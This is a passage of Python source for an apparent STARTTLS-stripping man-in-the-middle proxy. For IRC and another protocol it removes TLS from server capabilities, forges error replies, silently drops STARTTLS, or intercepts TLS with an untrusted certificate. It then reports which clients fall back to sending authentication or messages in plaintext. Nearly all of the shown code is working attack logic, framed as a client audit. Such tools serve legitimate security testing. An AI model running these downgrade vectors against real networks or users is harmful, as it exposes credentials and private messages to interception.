                    if not " OK " in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif " AUTHENTICATE " in data:
                    rewrite.set_result(session, True)
                return data

    class IRC:
        #rfc2244, rfc2595
        _PROTO_ID = 6667
        _REX_CAP = re.compile(r"\(([^\)]+)\)")
        _IDENT_PORT = 113
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw.lower() in data.lower() for kw in (" cap "," tls")):
                    mangled = []
                    for line in data.split("\n"):
                        if all(kw.lower() in line.lower() for kw in (" cap "," tls")):
                            # can be CAP LS or CAP ACK/NACK
                            if " ack " in data.lower():
                                line = line.replace("ACK","NAK").replace("ack","nak")
                            else:   #ls
                                features = line.split(" ")
                                line = ' '.join(f for f in features if not 'tls' in f.lower())
                        mangled.append(line)
                    data = "\n".join(mangled)
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return 
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                #elif all(kw.lower() in data.lower() for kw in ("cap req","tls")):
                #    # mangle CAPABILITY REQUEST
                #    if ":" in data:
                #        cmd, caps = data.split(":")
                #        caps = (c for c in caps.split(" ") if not "tls" in c.lower())
                #        data="%s:%s"%(cmd,' '.join(caps))
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'STARTTLS'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
        
        class StripWithNotRegistered:
            ''' 1) force server wrong state on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'You have not registered'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            
        class StripCAPWithNotRegistered:
            ''' 1) force server wrong state on client sending CAP LS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "CAP LS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'You have not registered'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            
        class StripWithSilentDrop:
            ''' 1) silently drop starttls command
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if " ident " in data.lower():
                    #TODO: proxy ident
                    pass
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'STARTTLS'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if not " 670 " in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data


class RewriteDispatcher(object):
    def __init__(self):
        self.vectors = {}   # proto:[vectors]
        self.results = []   # [ {session,client_ip,mangle,result}, }
        self.session_to_mangle = {}  # session:mangle
        
    def __repr__(self):
        return "<RewriteDispatcher vectors=%s>"%repr(self.vectors)
    
    def get_results(self):
        return self.results
    
    def get_results_by_clients(self):
        results = {}    #client:{mangle:result}
        for r in self.get_results():
            client = r['client']
            results.setdefault(client,[])
            mangle = r['mangle']
            result = r['result']
            results[client].append((mangle,result))
        return results
    
    def get_result(self, session):
        for r in self.get_results():
            if r['session']==session:
                return r
        return None
    
    def set_result(self, session, value):
        r = self.get_result(session)
        r['result'] = value
          
    def add(self, proto, attack):
        self.vectors.setdefault(proto,set([]))
        self.vectors[proto].add(attack)
        
    def get_mangle(self, session):
        ''' smart select mangle
            return same mangle for same session
            return different for different session
            try to use all mangles for same client-ip
        '''
        # 1) session already has a mangle associated to it
        mangle = self.session_to_mangle.get(session)
        if mangle:
            return mangle
        # 2) pick new mangle (round-robin) per client
        #    
        client_ip = session.inbound.peer[0]
        client_mangle_history = [r for r in self.get_results() if r['client']==client_ip]
        
        all_mangles = list(self.get_mangles(session.protocol.protocol_id))
        if not all_mangles:
            return None
        new_index = 0
        if client_mangle_history:
            previous_result = client_mangle_history[-1]
            new_index = (all_mangles.index(previous_result['mangle'])+1) % len(all_mangles)
        mangle = all_mangles[new_index]
            
        self.results.append({'client':client_ip,
                             'session':session,
                             'mangle':mangle,
                             'result':None}) 
 
        #mangle = iter(self.get_mangles(session.protocol.protocol_id)).next()
        logger.debug("<RewriteDispatcher  - changed mangle: %s new: %s>"%(mangle,"False" if len(client_mangle_history)>len(all_mangles) else "True"))
        self.session_to_mangle[session] = mangle
        return mangle
        
    def get_mangles(self, proto):
        return self.vectors.get(proto,[])
        
    def mangle_server_data(self, session, data):
        data_orig = data
        logging.debug("%s [client] <= [server]          %s"%(session,repr(data)))
        if self.get_mangle(session):
            data = self.get_mangle(session).mangle_server_data(session, data, self)
        if data!=data_orig:
            logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
        return data

    def mangle_client_data(self, session, data):
        data_orig = data
        logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
        if self.get_mangle(session):
            #TODO: just use the first one for now
            data = self.get_mangle(session).mangle_client_data(session, data, self)
        if data!=data_orig:
            logging.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
        return data
    
def main():
    import os
    from optparse import OptionParser
    ret = 0
    usage = """usage: %prog [options]
    
       example: %prog --listen 0.0.0.0:25 --remote mail.server.tld:25 
    """
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose",
                  action="store_true", dest="verbose", default=True,
                  help="make lots of noise [default]")
    parser.add_option("-l", "--listen", dest="listen", help="listen ip:port [default: 0.0.0.0:<remote_port>]")
    parser.add_option("-r", "--remote", dest="remote", help="remote target ip:port to forward sessions to")
    parser.add_option("-k", "--key", dest="key", default="server.pem", help="SSL Certificate and Private key file to use, PEM format assumed [default: %default]")
    
    all_vectors = []
    for proto in (v for v in dir(Vectors) if not v.startswith("_")):
        for test in (v for v in dir(getattr(Vectors,proto)) if not v.startswith("_")):
            all_vectors.append("%s.%s"%(proto,test))
    parser.add_option("-x", "--vectors",
                  default="ALL",
                  help="Comma separated list of vectors. Use 'ALL' (default) to select all vectors. Available vectors: "+", ".join(all_vectors)+""
                  " [default: %default]")
    # parse args
    (options, args) = parser.parse_args()
    # normalize args
    if options.verbose:
        logger.setLevel(logging.DEBUG)
    if not options.remote:
        parser.error("mandatory option: remote")
    else:
        options.remote = options.remote.strip().split(":")
        options.remote = (options.remote[0], int(options.remote[1]))
    if not options.listen:
        logger.warning("no listen port specified - falling back to 0.0.0.0:%d"%options.remote[1])
        options.listen = ("0.0.0.0",options.remote[1])
    else:
        options.listen = options.listen.strip().split(":")
        options.listen = (options.listen[0], int(options.listen[1]))
    options.vectors = [o.strip() for o in options.vectors.strip().split(",")]
    if "ALL" in options.vectors:
        options.vectors = all_vectors
    Vectors._TLS_CERTFILE = Vectors._TLS_KEYFILE = options.key
          
    # ---- start up engines ----
    prx = ProxyServer(listen=options.listen, target=options.remote, buffer_size=4096, delay=0.00001)
    logger.info("%s ready."%prx)
    rewrite = RewriteDispatcher()
    
    for classname in options.vectors:
        try:
            proto, vector = classname.split('.',1)
            cls_proto = getattr(globals().get("Vectors"),proto)
            cls_vector = getattr(cls_proto, vector)
            rewrite.add(cls_proto._PROTO_ID, cls_vector)
            logger.debug("* added test (port:%-5d, proto:%8s): %s"%(cls_proto._PROTO_ID, proto, repr(cls_vector)))
        except Exception, e:
            raise e

    logging.info( repr(rewrite))
    prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
    prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
    try:
        prx.main_loop()
    except KeyboardInterrupt:
        logger.warning( "Ctrl C - Stopping server")
        ret+=1
        
    logger.info(" -- audit results --")
    for client,resultlist in rewrite.get_results_by_clients().iteritems():
        logger.info("[*] client: %s"%client)
        for mangle, result in resultlist:
            logger.info("    [%-11s] %s"%("Vulnerable!" if result else " ",repr(mangle)))
        
    sys.exit(ret)
    
if __name__ == '__main__':
    main()
